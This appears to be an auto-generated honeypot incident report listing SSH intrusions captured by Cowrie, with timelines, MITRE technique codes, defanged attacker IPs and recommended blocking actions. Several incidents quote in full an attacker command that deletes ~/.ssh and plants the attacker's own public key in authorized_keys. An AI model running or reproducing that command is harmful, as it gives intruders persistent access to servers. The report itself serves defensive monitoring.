| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:26:50` | `cowrie.session.connect` |
| `2026-05-30 05:26:50` | `cowrie.client.version` |
| `2026-05-30 05:26:50` | `cowrie.client.kex` |
| `2026-05-30 05:26:50` | `cowrie.login.success` |
| `2026-05-30 05:26:51` | `cowrie.session.params` |
| `2026-05-30 05:26:51` | `cowrie.command.input` |
| `2026-05-30 05:26:51` | `cowrie.command.failed` |
| `2026-05-30 05:26:51` | `cowrie.log.closed` |
| `2026-05-30 05:26:51` | `cowrie.session.params` |
| `2026-05-30 05:26:51` | `cowrie.command.input` |
| `2026-05-30 05:26:51` | `cowrie.session.file_download` |
| `2026-05-30 05:26:51` | `cowrie.log.closed` |
| `2026-05-30 05:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996638823856

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:26 |
| **Last Seen** | 2026-05-30 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:26:53` | `cowrie.session.connect` |
| `2026-05-30 05:26:53` | `cowrie.client.version` |
| `2026-05-30 05:26:53` | `cowrie.client.kex` |
| `2026-05-30 05:26:54` | `cowrie.login.success` |
| `2026-05-30 05:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9a503f6a242

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:27 |
| **Last Seen** | 2026-05-30 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:27:47` | `cowrie.session.connect` |
| `2026-05-30 05:27:47` | `cowrie.client.version` |
| `2026-05-30 05:27:47` | `cowrie.client.kex` |
| `2026-05-30 05:27:48` | `cowrie.login.success` |
| `2026-05-30 05:27:48` | `cowrie.session.params` |
| `2026-05-30 05:27:48` | `cowrie.command.input` |
| `2026-05-30 05:27:48` | `cowrie.command.failed` |
| `2026-05-30 05:27:48` | `cowrie.log.closed` |
| `2026-05-30 05:27:49` | `cowrie.session.params` |
| `2026-05-30 05:27:49` | `cowrie.command.input` |
| `2026-05-30 05:27:49` | `cowrie.session.file_download` |
| `2026-05-30 05:27:49` | `cowrie.log.closed` |
| `2026-05-30 05:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca54f43d3ebc

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:27 |
| **Last Seen** | 2026-05-30 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:27:51` | `cowrie.session.connect` |
| `2026-05-30 05:27:51` | `cowrie.client.version` |
| `2026-05-30 05:27:51` | `cowrie.client.kex` |
| `2026-05-30 05:27:51` | `cowrie.login.success` |
| `2026-05-30 05:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dad34eab77

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:28 |
| **Last Seen** | 2026-05-30 05:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:28:42` | `cowrie.session.connect` |
| `2026-05-30 05:28:42` | `cowrie.client.version` |
| `2026-05-30 05:28:42` | `cowrie.client.kex` |
| `2026-05-30 05:28:43` | `cowrie.login.success` |
| `2026-05-30 05:28:43` | `cowrie.session.params` |
| `2026-05-30 05:28:43` | `cowrie.command.input` |
| `2026-05-30 05:28:43` | `cowrie.command.failed` |
| `2026-05-30 05:28:43` | `cowrie.log.closed` |
| `2026-05-30 05:28:44` | `cowrie.session.params` |
| `2026-05-30 05:28:44` | `cowrie.command.input` |
| `2026-05-30 05:28:44` | `cowrie.session.file_download` |
| `2026-05-30 05:28:44` | `cowrie.log.closed` |
| `2026-05-30 05:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2187d5861a

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-05-30 05:28 |
| **Last Seen** | 2026-05-30 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:28:46` | `cowrie.session.connect` |
| `2026-05-30 05:28:46` | `cowrie.client.version` |
| `2026-05-30 05:28:46` | `cowrie.client.kex` |
| `2026-05-30 05:28:46` | `cowrie.login.success` |
| `2026-05-30 05:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45173f7aad52

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:36 |
| **Last Seen** | 2026-05-30 05:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:36:54` | `cowrie.session.connect` |
| `2026-05-30 05:36:54` | `cowrie.client.version` |
| `2026-05-30 05:36:55` | `cowrie.client.kex` |
| `2026-05-30 05:36:56` | `cowrie.login.success` |
| `2026-05-30 05:36:56` | `cowrie.session.params` |
| `2026-05-30 05:36:56` | `cowrie.command.input` |
| `2026-05-30 05:36:56` | `cowrie.command.failed` |
| `2026-05-30 05:36:57` | `cowrie.log.closed` |
| `2026-05-30 05:36:57` | `cowrie.session.params` |
| `2026-05-30 05:36:57` | `cowrie.command.input` |
| `2026-05-30 05:36:57` | `cowrie.session.file_download` |
| `2026-05-30 05:36:57` | `cowrie.log.closed` |
| `2026-05-30 05:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c911ae98319

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:37 |
| **Last Seen** | 2026-05-30 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:37:01` | `cowrie.session.connect` |
| `2026-05-30 05:37:01` | `cowrie.client.version` |
| `2026-05-30 05:37:01` | `cowrie.client.kex` |
| `2026-05-30 05:37:02` | `cowrie.login.success` |
| `2026-05-30 05:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d31e833db1

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:38 |
| **Last Seen** | 2026-05-30 05:39 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:38:45` | `cowrie.session.connect` |
| `2026-05-30 05:38:45` | `cowrie.client.version` |
| `2026-05-30 05:38:46` | `cowrie.client.kex` |
| `2026-05-30 05:38:47` | `cowrie.login.success` |
| `2026-05-30 05:38:48` | `cowrie.session.params` |
| `2026-05-30 05:38:48` | `cowrie.command.input` |
| `2026-05-30 05:38:48` | `cowrie.command.failed` |
| `2026-05-30 05:38:48` | `cowrie.log.closed` |
| `2026-05-30 05:38:48` | `cowrie.session.params` |
| `2026-05-30 05:38:48` | `cowrie.command.input` |
| `2026-05-30 05:38:49` | `cowrie.session.file_download` |
| `2026-05-30 05:38:49` | `cowrie.log.closed` |
| `2026-05-30 05:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ec5bfc719d

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:38 |
| **Last Seen** | 2026-05-30 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:38:58` | `cowrie.session.connect` |
| `2026-05-30 05:38:58` | `cowrie.client.version` |
| `2026-05-30 05:38:58` | `cowrie.client.kex` |
| `2026-05-30 05:38:59` | `cowrie.login.success` |
| `2026-05-30 05:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d0e4140b3d

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:42 |
| **Last Seen** | 2026-05-30 05:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:42:29` | `cowrie.session.connect` |
| `2026-05-30 05:42:29` | `cowrie.client.version` |
| `2026-05-30 05:42:30` | `cowrie.client.kex` |
| `2026-05-30 05:42:31` | `cowrie.login.success` |
| `2026-05-30 05:42:31` | `cowrie.session.params` |
| `2026-05-30 05:42:31` | `cowrie.command.input` |
| `2026-05-30 05:42:31` | `cowrie.command.failed` |
| `2026-05-30 05:42:32` | `cowrie.log.closed` |
| `2026-05-30 05:42:32` | `cowrie.session.params` |
| `2026-05-30 05:42:32` | `cowrie.command.input` |
| `2026-05-30 05:42:33` | `cowrie.session.file_download` |
| `2026-05-30 05:42:33` | `cowrie.log.closed` |
| `2026-05-30 05:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ea69b8fe28

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:42 |
| **Last Seen** | 2026-05-30 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:42:37` | `cowrie.session.connect` |
| `2026-05-30 05:42:37` | `cowrie.client.version` |
| `2026-05-30 05:42:37` | `cowrie.client.kex` |
| `2026-05-30 05:42:38` | `cowrie.login.success` |
| `2026-05-30 05:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c5bb3191d9

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:44 |
| **Last Seen** | 2026-05-30 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:44:15` | `cowrie.session.connect` |
| `2026-05-30 05:44:15` | `cowrie.client.version` |
| `2026-05-30 05:44:15` | `cowrie.client.kex` |
| `2026-05-30 05:44:16` | `cowrie.login.success` |
| `2026-05-30 05:44:17` | `cowrie.session.params` |
| `2026-05-30 05:44:17` | `cowrie.command.input` |
| `2026-05-30 05:44:17` | `cowrie.command.failed` |
| `2026-05-30 05:44:17` | `cowrie.log.closed` |
| `2026-05-30 05:44:18` | `cowrie.session.params` |
| `2026-05-30 05:44:18` | `cowrie.command.input` |
| `2026-05-30 05:44:18` | `cowrie.session.file_download` |
| `2026-05-30 05:44:18` | `cowrie.log.closed` |
| `2026-05-30 05:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a35b1eaf83f

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-30 05:44 |
| **Last Seen** | 2026-05-30 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:44:21` | `cowrie.session.connect` |
| `2026-05-30 05:44:21` | `cowrie.client.version` |
| `2026-05-30 05:44:21` | `cowrie.client.kex` |
| `2026-05-30 05:44:23` | `cowrie.login.success` |
| `2026-05-30 05:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.199.56[.]58` | **33** | 2026-05-30 04:12 | 2026-05-30 04:12 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `197.199.224[.]52` | **15** | 2026-05-30 04:57 | 2026-05-30 05:21 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `212.115.54[.]84` | **15** | 2026-05-30 04:56 | 2026-05-30 05:28 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.31.95[.]163` | **12** | 2026-05-30 05:10 | 2026-05-30 05:44 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `66.132.172[.]43` | **7** | 2026-05-30 06:46 | 2026-05-30 06:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.147[.]62` | **6** | 2026-05-30 05:19 | 2026-05-30 05:19 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `144.48.135[.]122` | **6** | 2026-05-30 05:34 | 2026-05-30 05:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `177.82.240[.]176` | **5** | 2026-05-30 04:23 | 2026-05-30 04:31 | 10m | 0 | `T1592` | 🟢 LOW |
| `194.87.97[.]159` | **5** | 2026-05-30 04:38 | 2026-05-30 04:52 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.128[.]59` | **4** | 2026-05-30 06:08 | 2026-05-30 06:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.27.154[.]152` | **3** | 2026-05-30 05:00 | 2026-05-30 05:04 | 4m | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]56` | **3** | 2026-05-30 06:07 | 2026-05-30 06:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `69.157.68[.]14` | **3** | 2026-05-30 05:16 | 2026-05-30 05:27 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.90[.]166` | **2** | 2026-05-30 04:32 | 2026-05-30 04:34 | 4m | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | **2** | 2026-05-30 04:13 | 2026-05-30 05:20 | 1m | 0 | `T1592` | 🟢 LOW |
| `152.172.100[.]254` | **2** | 2026-05-30 06:21 | 2026-05-30 06:24 | 4m | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | **2** | 2026-05-30 03:59 | 2026-05-30 04:11 | 1m | 0 | `T1592` | 🟢 LOW |
| `222.98.122[.]37` | **2** | 2026-05-30 05:04 | 2026-05-30 05:14 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.22[.]12` | 1 | 2026-05-30 05:14 | 2026-05-30 05:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]63` | 1 | 2026-05-30 05:21 | 2026-05-30 05:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.35.248[.]174` | 1 | 2026-05-30 05:02 | 2026-05-30 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.12.135[.]35` | 1 | 2026-05-30 05:24 | 2026-05-30 05:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.119.21[.]245` | 1 | 2026-05-30 05:10 | 2026-05-30 05:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.191.66[.]84` | 1 | 2026-05-30 05:41 | 2026-05-30 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.196.157[.]119` | 1 | 2026-05-30 05:14 | 2026-05-30 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `136.34.134[.]182` | 1 | 2026-05-30 04:08 | 2026-05-30 04:08 | 3s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]25` | 1 | 2026-05-30 05:24 | 2026-05-30 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.16.214[.]226` | 1 | 2026-05-30 05:14 | 2026-05-30 05:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.102.73[.]93` | 1 | 2026-05-30 06:19 | 2026-05-30 06:19 | 41s | 0 | `T1592` | 🟢 LOW |
| `203.0.104[.]170` | 1 | 2026-05-30 05:18 | 2026-05-30 05:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.134.115[.]133` | 1 | 2026-05-30 05:01 | 2026-05-30 05:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.143.61[.]4` | 1 | 2026-05-30 04:57 | 2026-05-30 04:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.157.47[.]40` | 1 | 2026-05-30 04:45 | 2026-05-30 04:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `43.138.40[.]107` | 1 | 2026-05-30 04:29 | 2026-05-30 04:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.142.113[.]25` | 1 | 2026-05-30 04:26 | 2026-05-30 04:27 | 31s | 0 | `T1592` | 🟢 LOW |
| `45.11.110[.]77` | 1 | 2026-05-30 04:53 | 2026-05-30 04:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]57` | 1 | 2026-05-30 06:08 | 2026-05-30 06:08 | 5s | 0 | `T1592` | 🟢 LOW |
